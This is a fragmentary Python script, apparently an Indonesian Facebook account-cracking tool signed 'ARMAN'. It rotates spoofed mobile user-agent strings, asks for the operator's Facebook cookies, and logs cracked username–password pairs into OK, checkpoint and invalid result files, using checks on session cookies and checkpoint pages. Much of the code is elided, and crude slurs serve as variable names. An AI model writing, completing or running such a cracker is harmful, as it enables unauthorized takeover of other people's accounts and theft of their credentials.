...
#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile','MOT-L6i/0A.64.19R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1','Nokia110/2.0+(03.33)+Profile/MIDP-2.1+Configuration/CLDC-1.1+UCWEB/2.0+(Java;+U;+MIDP-2.0;+en-US;+Nokia110)+U2/1.0.0+UCBrowser/9.5.0.449+U2/1.0.0+Mobile+UNTRUSTED/1.0','NokiaX2-01/5.0 (08.70) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.3.0.154/69/352 UNTRUSTED/1.0','UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; en-US; Lenny4 Build/NRD90M) U2/1.0.0 UCMini/10.9.0.946 (SpeedMode; Android 7.0; Lenny4 Build/NRD90M) Mobile','MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0','UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; pt-BR; Coolpad 8297-T01 Build/KTU84P) U2/1.0.0 UCMini/10.9.0.946 (SpeedMode; Android 4.4.4; Coolpad 8297-T01 Build/KTU84P) Mobile','NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Opera/9.80 (Android 10; Linux; Opera Mobi/ADR-1502251211) Presto/2.11.355 Version/12.10 UNTRUSTED/1.0','UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; pt-BR; VF685 Build/KOT49H) U2/1.0.0 UCMini/10.9.0.946 (SpeedMode; Android 4.4.2; VF685 Build/KOT49H) Mobile']
#agen2 = ['Mozilla/5.0 (Linux; Android 12; SM-N981U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F771.15 (KHTML, like Gecko) Mobile/19F77','Mozilla/5.0 (Linux; Android 12; SM-G998U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-S908U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G991U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77','Mozilla/5.0 (Linux; Android 12; SM-G973U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G781V Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G965U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-S901U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-S906U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A136U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36']
###########################################################################################
...
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n{N} ▌│█║▌║▌║ARMAN  METHOD║▌║▌║█│▌{N} """)
    print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
    print(f"░ ░{P}[{H}•{P}] Author    : ARMAN                  {N}░ ░")
    print(f"░ ░{P}[{H}•{P}] Kamu      : ARMAN                  {N}░ ░")
    print(f"░ ░{P}[{H}•{P}] Kita      : SEMUA ARMAN           {N} ░ ░")
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCRACK BY ARMAN  SC SELESAI...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            jalan(' %s[%s✓%s] Retrun SC type "%spython ARMAN anyar.py%s"'%(N,H,N,H,N));exit()
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}python ARMAN anyar.py{N}'");exit()
        else:
...
def yayanxd():
    os.system('clear')
    try:
    	___kontol___ = input('[|] ARMAN  Cookies : ')
...
###### CEK HASIL CRACK #####
        ...
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[ARMAN -OK] ","\x1b[1;92m[ARMAN -OK] ").replace("[ARMAN -CP] ", "\x1b[1;93m[ARMAN -CP] ")
...
###### HAPUS COOKIE #####
        ...
        jalan('\n %s[%s✓%s] Retrun SC type "%spython ARMAN anyar.py%s"'%(N,H,N,H,N));exit()
    else:
    ...
    if "c_user" in session.cookies.get_dict():
        ...
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                ...
                open('results/ERROR.txt', 'a').write(f"[ARMAN -CP] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f"[ARMAN -CP] {user} • {pasw}\n")
        ...
        open('results/INVALID-OK.txt', 'a').write(f"[ARMAN -CP] {user} • {pasw}\n")
#UBAH PW
